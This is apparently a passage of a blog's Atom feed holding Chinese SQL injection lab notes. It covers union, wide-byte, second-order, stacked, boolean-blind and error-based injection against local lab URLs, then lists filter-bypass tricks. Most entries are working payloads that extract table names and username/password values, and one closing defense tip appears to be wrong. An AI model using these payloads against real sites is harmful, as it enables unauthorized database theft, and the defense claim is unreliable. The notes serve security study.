-    <content type="html"><![CDATA[<p>例：<a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断字段数："><a href="#判断字段数：" class="headerlink" title="判断字段数："></a>判断字段数：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> order by 1-99 </p><h1 id="查看数据回显位置："><a href="#查看数据回显位置：" class="headerlink" title="查看数据回显位置："></a>查看数据回显位置：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,4,5,6</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,database(),5,6   </p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),5,6  </p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,(select group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=’test’ and TABLE_NAME=’users’),5,6  </p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,(select group_concat(username,password) from test.users),5,6   </p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*若在查看回显位置时页面没有返回值，说明回显的数据没有地方存放，应该把id变成-1，以便回显数值，之后的操作同理。</p><p>*联合注入只能执行查询语句</p><p>*这里查询时因为有多个语句，所以用group-concat，这个语句的作用就是将所有的查询结果打包，以字符串的形式输出。还可以用limit进行逐个输出</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://127.0.0.1/web/union.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/web/union.php?id=1&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;*判断注入点及类型，见
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>宽字节注入</title>
-    <link href="http://yoursite.com/2019/08/09/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2019/08/09/宽字节注入/</id>
-    <published>2019-08-09T14:47:44.685Z</published>
-    <updated>2019-08-09T14:59:31.971Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://192.168.11.128/web/kuanzifu.php" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断数据库字段数："><a href="#判断数据库字段数：" class="headerlink" title="判断数据库字段数："></a>判断数据库字段数：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=1%df&#39;</a> order by 6–+</p><p>*此处的%df的作用是绕过转义，具体见文末</p><h1 id="查看数据回显位置："><a href="#查看数据回显位置：" class="headerlink" title="查看数据回显位置："></a>查看数据回显位置：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,2,3,4,5,6–+</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(database()),3,4,5,6–+</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6–+</p><p>*此处不直接跟数据库名的原因是，单引号’会被转义，会导致查询出错，所以在数据库名的位置再嵌入一次查询</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=((select table_name from information_schema.tables where table_schema=database() limit 0,1))),3,4,5,6–+</p><p>*此处内嵌的查询表名语句只能用limit，不能用group_conat，因为此时是读取单个表，相当于table_name=’users’,这里table_name只能有一个表，不能同时有多个表</p><h1 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(select group_concat(id) from test.users),3,4,5,6–+</p><h3 id="要点（SQL注入绕过技巧之宽字节注入）："><a href="#要点（SQL注入绕过技巧之宽字节注入）：" class="headerlink" title="要点（SQL注入绕过技巧之宽字节注入）："></a>要点（SQL注入绕过技巧之宽字节注入）：</h3><p>*宽字节注入，它的作用可以绕过转义，也是绕过转义的其中一个办法</p><p>*宽字节注入源于设置MySQL连接时错误配置为：set character_set_client=gbk；这样配置会引发编码转换从而导致的注入漏洞。(GBK导致的问题)</p><p>*当GPC开启(php.ini<br>magic_quotes_gpc = On)或使用addslashes函数过滤提交的参数时，测试注入点使用的单引号 ‘ 就会被转义为: \’，这个的作用就是对敏感函数的转义，让我们无法注入。</p><p>*如果存在宽字节注入，我们输入%df%27时首先经过上面提到的转义就会变成%df%5c%27(%5c就是反斜杠)。之后再数据库查询由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字，然后MySQL服务器会对查询语句进行了GBK编码%df%5c转换成汉字，而单引号逃出了，这个时候就可以注入了。</p><p>*%df不是固定的，可以自己组合。只要是汉字就可以。<br>在mysql中，用于转义（即在字符串中的符号前加上”\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。</p><p>*GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://192.168.11.128/web/kuanzifu.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.11.128/web/kuanzifu.php&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;*判断注入
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>二次注入</title>
-    <link href="http://yoursite.com/2019/08/09/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2019/08/09/二次注入/</id>
-    <published>2019-08-09T14:47:44.683Z</published>
-    <updated>2019-08-09T14:59:24.775Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://192.168.11.128/web/double1.php（注册页面）" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php（注册页面）</a></p><p>​    <a href="http://192.168.11.128/web/double2.php（查询页面）" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php（查询页面）</a></p><p>**判断注入点及类型，见SQL注入基本知识-判断注入类型（查询页面进行）</p><h1 id="在注册页面传入非法字符："><a href="#在注册页面传入非法字符：" class="headerlink" title="在注册页面传入非法字符："></a>在注册页面传入非法字符：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a></p><p>*这里的zr’注册之后会传进数据库储存，查询之后就会构造出一个语句</p><p>*注册完成后会在页面返回一个id值，用这个值在查询页面执行语句</p><h1 id="在查询界面输入id进行查询："><a href="#在查询界面输入id进行查询：" class="headerlink" title="在查询界面输入id进行查询："></a>在查询界面输入id进行查询：</h1><p><a href="http://192.168.11.128/web/double2.php?id=6" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=6</a></p><p>*这里和普通的判断注入类型类似，只不过是先把构造语句放入数据库，再让他读取出来进行执行</p><h1 id="查询字段数："><a href="#查询字段数：" class="headerlink" title="查询字段数："></a>查询字段数：</h1><p><a href="http://192.168.11.128/web/double1.php?id=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?id=zr&#39;</a> order by 5–+</p><p><a href="http://192.168.11.128/web/double2.php?id=7" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=7</a></p><p>*和上面一样，将构造语句写入数据库，然后再从id读出，执行语句</p><h1 id="查看数据回显位置："><a href="#查看数据回显位置：" class="headerlink" title="查看数据回显位置："></a>查看数据回显位置：</h1><p><a href="http://192.168.11.128/web/double1.php?id=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?id=zr&#39;</a> union select 1,2,3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=8" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=8</a></p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(database()),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=9" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=9</a></p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=10" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=10</a></p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=11" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=11</a></p><h1 id="爆数值"><a href="#爆数值" class="headerlink" title="爆数值:"></a>爆数值:</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(select group_concat(id) from test.users),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=12" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=12</a></p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*二次注入的原理就是，将构造语句传入数据库并储存，然后查询时语句就会被执行</p><p>*这里的注册页面没有输入框，直接使用的是url，若注册页面有输入框，就不用再url里面注册，直接在注册框注册即可</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://192.168.11.128/web/double1.php（注册页面）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.11.128/web/double1.php（注册页面）&lt;/a&gt;&lt;/p
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>堆叠注入</title>
-    <link href="http://yoursite.com/2019/08/09/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2019/08/09/堆叠注入/</id>
-    <published>2019-08-09T14:47:44.680Z</published>
-    <updated>2019-08-09T15:00:54.203Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://192.168.11.128/web/duidie.php" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(length(database())&gt;=1,sleep(5),1)</p><p>*这里堆叠注入采用了时间盲注，可见；后面语句和时间盲注并无差别</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr(database(),1,1)=’t’,sleep(5),1)</p><p>*爆库名这里和盲注一样，使用Burp</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr((select column_name from information_schema.columns where table_schema=’test’  and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1)</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*分号；在数据库中表示一个语句结束，分号结束后再构造一条语句就表示堆叠注入</p><p>*此处是采用的时间盲注进行的，视具体情况而定</p><p>*堆叠注入相比联合注入，它能执行任何数据库语句，而联合注入只能执行查询语句</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://192.168.11.128/web/duidie.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.11.128/web/duidie.php&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;*判断注入点及类型
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>布尔盲注</title>
-    <link href="http://yoursite.com/2019/08/09/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
-    <id>http://yoursite.com/2019/08/09/布尔盲注/</id>
-    <published>2019-08-09T14:47:44.677Z</published>
-    <updated>2019-08-09T14:59:34.696Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.55/web/boolean.php?id=1" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and length(database())&gt;=4–+</p><p>*此处为了判断数据库名的长度，如数据库为test，则长度为4</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and substr(database(),1,1)=’a’–+</p><p>*substr为数据库的一种函数，它的作用是从一个字符串截取一部分返回。</p><p>*database()后面的1,1表示这个字符串的第一个字符，2,1表示第二个字符。</p><p>*此语句执行一次只能判断一个字符，需要结合Burp狙击手来爆破。</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’a’–+</p><p>*limit 0,1表示从第几个字符串开始。例如，数据库中依次有person，user，password 三个表，0,1表示从person开始读取，1,1就表示从user读取。</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’a’–+</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and substr((select id from test.users limit 0,1),1,1)=’a’–+</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*当判断页面注入类型时，若页面只返回正确和错误，不返回报错信息时，只能采用盲注的方式。</p><p>*盲注执行一次代码判断的是一个字符，手工输入很消耗精力，需要用到Burp的狙击手来帮助，使用方式见SQL注入基本知识-利用Burp进行盲注。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.55/web/boolean.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.55/web/boolean.php?id=1&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;*
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>报错注入</title>
-    <link href="http://yoursite.com/2019/08/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2019/08/09/报错注入/</id>
-    <published>2019-08-09T14:47:44.674Z</published>
-    <updated>2019-08-09T14:59:38.097Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.53/web/error.php" target="_blank" rel="noopener">http://172.16.13.53/web/error.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(database()),0x7e),1)–+</p><p>*updatexml语法格式为以上形式</p><p>*0x7e转义过来是波浪符号~</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),0x7e),1)–+</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),0x7e),1)–+</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(username,password) from test.users ),0x7e),1)–+</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*报错注入的条件是页面能返回报错的信息，能从报错信息中得到有用信息</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.53/web/error.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.53/web/error.php&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;*判断注入点及类型，见SQL注
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL注入绕过技巧</title>
-    <link href="http://yoursite.com/2019/08/09/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
-    <id>http://yoursite.com/2019/08/09/SQL注入绕过技巧/</id>
-    <published>2019-08-09T14:47:44.671Z</published>
-    <updated>2019-08-09T14:59:06.691Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="大小写绕过："><a href="#大小写绕过：" class="headerlink" title="大小写绕过："></a>大小写绕过：</h1><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</p><p>例如：id=1 UNion SElecT  1,2,3</p><h1 id="替换关键字："><a href="#替换关键字：" class="headerlink" title="替换关键字："></a>替换关键字：</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过。</p><p>例如：id=1 UNIunionON SELselectECT 1,2,3</p><h1 id="空格绕过："><a href="#空格绕过：" class="headerlink" title="空格绕过："></a>空格绕过：</h1><p>有些情况SQL会过滤空格，使得空格无法生效，可以用一下方式绕过。</p><p>例如：</p><p>id=1<code>/**/</code>union<code>/**/</code>select<code>/**/</code>1,2,3    //用<code>/**/</code>代替空格</p><p>id=1%0aunion%a0select%a01,2,3             //用%0a(回车)代替空格</p><p>id=1()union()select()1,2,3                           //用()代替空格</p><p>……</p><h1 id="引号绕过（用16进制）："><a href="#引号绕过（用16进制）：" class="headerlink" title="引号绕过（用16进制）："></a>引号绕过（用16进制）：</h1><p>会使用到引号的地方一般是在最后的where子句中，如select column_name  from information_schema.tables where table_name=’users’</p><p>将’users’转变为16进制为0x7573657273</p><h1 id="逗号绕过："><a href="#逗号绕过：" class="headerlink" title="逗号绕过："></a>逗号绕过：</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p><h6 id="使用from-for绕过（substr-和mid-可以使用-："><a href="#使用from-for绕过（substr-和mid-可以使用-：" class="headerlink" title="使用from for绕过（substr()和mid()可以使用)："></a>使用from for绕过（substr()和mid()可以使用)：</h6><p>例：id=1 and substr(database(),1,1)=’a’</p><p>​        id=1 and substr(database() from 1 for 1)=’1’</p><h6 id="使用join绕过："><a href="#使用join绕过：" class="headerlink" title="使用join绕过："></a>使用join绕过：</h6><p>union select 1,2等价于union select * from (select 1)a join (select 2)b</p><h6 id="使用like："><a href="#使用like：" class="headerlink" title="使用like："></a>使用like：</h6><p>select ascii(mid(user(),1,1))=80等价于select user() like ‘r%’</p><h6 id="对于limit可以使用offset来绕过："><a href="#对于limit可以使用offset来绕过：" class="headerlink" title="对于limit可以使用offset来绕过："></a>对于limit可以使用offset来绕过：</h6><p>select * from news limit 0,1等价于select * from news limit 1 offset 0</p><h1 id="比较符号绕过（’-gt-’-’-lt-’-’-’）："><a href="#比较符号绕过（’-gt-’-’-lt-’-’-’）：" class="headerlink" title="比较符号绕过（’&gt;’,’&lt;’,’=’）："></a>比较符号绕过（’&gt;’,’&lt;’,’=’）：</h1><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</p><h6 id="用greatest，least代替大于小于符号："><a href="#用greatest，least代替大于小于符号：" class="headerlink" title="用greatest，least代替大于小于符号："></a>用greatest，least代替大于小于符号：</h6><p>例：id=1 and length(database())&gt;2</p><p>​        id=1 and greatest(length(database()),2)=2</p><p>​        *greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p><h6 id="使用between-and："><a href="#使用between-and：" class="headerlink" title="使用between and："></a>使用between and：</h6><p>*between a and b：返回a，b之间的数据，不包含b。</p><h6 id="绕过等号："><a href="#绕过等号：" class="headerlink" title="绕过等号："></a>绕过等号：</h6><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h1 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a>or and xor not绕过：</h1><p>有些时候SQL会过滤上述的关键字，导致输入的关键字不能执行。</p><h6 id="使用大小写、替换关键字绕过："><a href="#使用大小写、替换关键字绕过：" class="headerlink" title="使用大小写、替换关键字绕过："></a>使用大小写、替换关键字绕过：</h6><p>id=1 and 1=1等价于id=1 aandnd 1=1</p><p>id=1 and 1=1等价于id=1 ANd 1=1</p><h6 id="使用字符代替："><a href="#使用字符代替：" class="headerlink" title="使用字符代替："></a>使用字符代替：</h6><p>or=||    </p><p>and=&amp;&amp;    </p><p>xor=|    </p><p>not=!</p><h1 id="注释符号绕过："><a href="#注释符号绕过：" class="headerlink" title="注释符号绕过："></a>注释符号绕过：</h1><p>一般常用注释符号有#，–+，– ，– -等，但是SQL如果过滤了这些注释符，就会使得注释无效。</p><p>例：id=1’ union select 1,2,3</p><p>id=1’ union select 1,2,3||’1或者id=1’ union select 1,2,’3</p><p>*单引号的作用是将后面的单引号闭合掉</p><h1 id="内联绕过："><a href="#内联绕过：" class="headerlink" title="内联绕过："></a>内联绕过：</h1><p>例如，一个函数过滤了select关键字，双写，大小写等方法都不奏效，这时可以使用内联绕过。</p><p>id=1 union select 1,database(),3</p><p>这里可以用<code>/*!select*/</code>代替select，<code>/*！*/</code>中的内容将强制执行</p><h1 id="通用编码绕过："><a href="#通用编码绕过：" class="headerlink" title="通用编码绕过："></a>通用编码绕过：</h1><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><p>or 1=1即为%6f%72%20%31%3d%31</p><h1 id="等价函数绕过："><a href="#等价函数绕过：" class="headerlink" title="等价函数绕过："></a>等价函数绕过：</h1><p>SQL若过滤了每个函数导致函数不能使用，可以寻找它的等价函数来替代当前函数。</p><p>hex()、bin() ==&gt; ascii()</p><p>sleep() ==&gt;benchmark()</p><p>concat_ws()==&gt;group_concat()</p><p>mid()、substr() ==&gt; substring()</p><h1 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h1><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路。</p><p>1、%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：id=-1%df%27union select 1,user(),3–+　　</p><p>2、将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><h6 id="一般产生宽字节注入的PHP函数："><a href="#一般产生宽字节注入的PHP函数：" class="headerlink" title="一般产生宽字节注入的PHP函数："></a>一般产生宽字节注入的PHP函数：</h6><p>   1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p><p>   2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：\x00     \n     \r     \     ‘     “     \x1a</p><p>（防御方法，将mysql编码方式设置为gbk即可）</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
